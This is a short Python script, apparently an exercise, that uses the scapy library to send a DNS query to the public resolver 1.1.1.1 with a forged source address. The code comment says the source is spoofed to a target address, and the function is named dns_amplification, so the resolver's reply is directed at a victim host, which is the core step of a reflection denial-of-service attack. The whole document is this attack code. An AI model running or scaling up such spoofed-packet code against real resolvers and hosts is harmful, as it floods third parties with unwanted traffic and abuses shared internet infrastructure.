#Address: ans.an[0].rdata
from scapy.all import *


def dns_amplification(dns_server_address, target_address):
    # source is spoofed target address
    ip_info = IP(src=target_address, dst=dns_server_address)
    udp_info = UDP(
        sport=RandShort(),
        dport=53
    )
    dns_info = DNS(
        rd=1,
        qd=DNSQR(qname="snl.no",qtype="A")
    )
    ans = sr1(ip_info/udp_info/dns_info)
    print(ans.show())
    
if __name__ == "__main__":
    dns_amplification("1.1.1.1", "192.168.11.231")